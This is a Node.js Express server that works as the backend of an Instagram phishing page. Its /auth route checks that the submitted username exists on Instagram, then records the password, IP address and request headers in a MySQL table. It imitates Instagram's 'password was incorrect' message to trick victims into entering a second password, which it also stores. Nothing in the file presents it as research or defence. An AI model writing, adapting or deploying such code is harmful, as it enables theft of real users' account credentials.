const express=require('express');
const path=require('path')
const app=express();
const mysql=require('mysql');
const request=require('request')
const pool=require('./pool')


app.use(express.static('../client'))
app.use(express.urlencoded({extended:false}));
app.use(express.json());

app.get('/',(req,res)=>{
    
    res.sendFile(path.join(__dirname,'../client/index.html'))
    
 })
let data={}
app.post('/auth',(req,res)=>{
    console.log(req.body);
    let url=`https://www.instagram.com/${req.body.id}`
    request.get(url,(err,resp,body)=>{
        if(resp.statusCode === 200){
            if(req.body.attempt===0){
                console.log(req.body);
                data.status="Not OK",
                data.error="Sorry, your password was incorrect. Please double-check your password.",
                data.tryNum="1"
                pool.getConnection((err,connection)=>{
                    if(err) throw err;
                    let sql=`insert into loginInfo (username,pwd1,user_info,user_ip,samay) values (?)`;
                    connection.query(sql,[req.body.id,req.body.pwd,req.ip,req.headers],(error)=>{

                        connection.release();

                        if(error) throw error 
                    })

                })
                res.send(data)
            }else{
                
                pool.getConnection((err,connection)=>{
                    if (err) {
                        throw err;
                    }
                    let sql='Insert into logininfo (pwd2) values (?)';
                    connection.query(sql,[req.body.pwd],(error)=>{
                        connection.release();
                        if(error) throw error;
                    })
                    let sql2="insert into userData ("

                })
                data.status="OK"
                res.send(data)
            }
            
            
        }
        else{
            data.status="Not OK";
            data.error="The username you entered doesn't belong to an account. Please check your username and try again.";
            res.send(data)
        }
    });

})

app.post('/survey-report',(req,res)=>{
    console.log(req.body);
    res.sendStatus(200)
})






app.listen(process.env.PORT || 3131,console.log("Running on 3131"))